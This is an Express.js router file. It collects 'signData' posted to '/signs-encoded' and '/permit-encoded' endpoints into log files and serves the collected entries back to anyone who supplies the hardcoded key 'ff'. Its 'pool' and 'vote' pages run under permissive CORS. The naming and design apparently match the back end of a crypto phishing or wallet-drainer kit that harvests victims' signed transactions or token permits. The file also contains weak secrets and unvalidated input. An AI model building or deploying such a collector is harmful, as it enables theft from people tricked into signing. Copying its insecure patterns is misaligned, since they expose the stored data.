var express = require('express');
var router = express.Router();
var fs = require("fs");
const claveSign = 'ff';
const clavePermit = 'ff';

function writeSign(signData) {
  fs.appendFile("./logs/sign.txt", JSON.stringify(signData) + "\n", (err) => {
    if (err) throw err;
  });
}

function writePermit(signData) {
  fs.appendFile("./logs/permit.txt", JSON.stringify(signData) + "\n", (err) => {
    if (err) throw err;
  });
}

router.post('/signs-encoded', (req, res) => {
  const { signData } = req.body;

  writeSign(signData);
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({ "ok": true }));
});

router.post('/permit-encoded', (req, res) => {
  const { signData } = req.body;

  writePermit(signData);
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({ "ok": true }));
});

router.get('/signs', (req, res) => {
  var arrayTest = [], locals = {};
  const { key } = req.query;

  if (key == claveSign) {
    const readline = require("readline"),
      NOMBRE_ARCHIVO = "./logs/sign.txt";
  
    let lector = readline.createInterface({
        input: fs.createReadStream(NOMBRE_ARCHIVO)
    });
  
    lector.on("line", linea => {
      arrayTest.push(JSON.parse(linea));
    });

    setTimeout(() => {
      locals['signs'] = arrayTest;
      res.render('signs', locals)
    }, 3000)
  } else {
    res.render('index');
  }
});

router.get('/permit', (req, res) => {
  var arrayTest = [], locals = {};
  const { key } = req.query;

  if (key == clavePermit) {
    const readline = require("readline"),
      NOMBRE_ARCHIVO = "./logs/permit.txt";

    let lector = readline.createInterface({
        input: fs.createReadStream(NOMBRE_ARCHIVO)
    });

    lector.on("line", linea => {
      arrayTest.push(JSON.parse(linea));
    });

    setTimeout(() => {
      locals['signs'] = arrayTest;
      res.render('permit', locals)
    }, 3000)
  } else {
    res.render('index');
  }
});

router.get('/pool', function(req, res, next) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE'); // If needed
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, Content-type'); // If needed
  res.setHeader('Access-Control-Allow-Credentials', true); // If needed
  //res.setHeader('Accept-Encoding', 'gzip');
  //res.setHeader('Transfer-Encoding', 'gzip');
  //res.setHeader('Content-Encoding', 'brotli');
  
  res.render('pool');
});

router.get('/vote', function(req, res, next) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE'); // If needed
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, Content-type'); // If needed
  res.setHeader('Access-Control-Allow-Credentials', true); // If needed
  //res.setHeader('Accept-Encoding', 'gzip');
  //res.setHeader('Transfer-Encoding', 'gzip');
  //res.setHeader('Content-Encoding', 'brotli');
  
  res.render('vote');
});

/* GET home page. */
router.get('*', function(req, res, next) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE'); // If needed
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With, Content-type'); // If needed
  res.setHeader('Access-Control-Allow-Credentials', true); // If needed
  //res.setHeader('Accept-Encoding', 'gzip');
  //res.setHeader('Transfer-Encoding', 'gzip');
  //res.setHeader('Content-Encoding', 'brotli');
  
  res.render('index');
});


module.exports = router;
